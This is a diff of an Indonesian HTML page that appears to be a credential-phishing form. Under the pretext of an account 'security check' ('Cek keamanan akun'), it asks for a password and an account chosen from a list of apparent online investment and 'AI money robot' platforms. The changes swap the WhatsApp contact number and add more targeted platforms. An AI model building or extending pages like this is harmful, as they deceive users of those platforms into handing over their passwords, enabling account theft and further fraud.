@@ -146,7 +146,7 @@
 <body>
     <div class="navbar">
         <a href="#" onclick="showImages()">CARA CEK AKUN</a>
-        <a href="https://wa.me/628815035520" target="_blank">CONTACT</a>
+        <a href="https://wa.me/6283144282450" target="_blank">CONTACT</a>
     </div>
 
     <div class="login-form">
@@ -158,13 +158,19 @@
             <input type="password" id="password" name="password" required><br>
             <label for="account">Account:</label><br>
             <select id="account" name="account">
-                <option value="AI Uang Robot">AI Uang Robot</option>
+                <option value="SunPower">SunPower</option>
                 <option value="Grapix AI">Grapix AI</option>
-                <option value="Star AI">Star AI</option>
+                <option value="Surplus Global">Surplus Global</option>
                 <option value="Quantum">Quantum</option>
                 <option value="Bc Energy">Bc Energy</option>
                 <option value="Sehl Fund">Sehl Fund</option>
-                <option value="FTA AI">FTA AI</option>
+                <option value="Star AI">FTA AI</option>
+                <option value="Shellssss">Shellssss</option>
+                <option value="SiemenEnergy">SiemenEnergy</option>
+                <option value="Grafatar">Grafatar</option>
+                <option value="Bicca99">Bicca99</option>
+                <option value="Violet">Violet</option>
+                <option value="Zionsx">Zionsxr</option>
             </select><br>
             <button type="submit">Cek keamanan akun</button>
         </form>
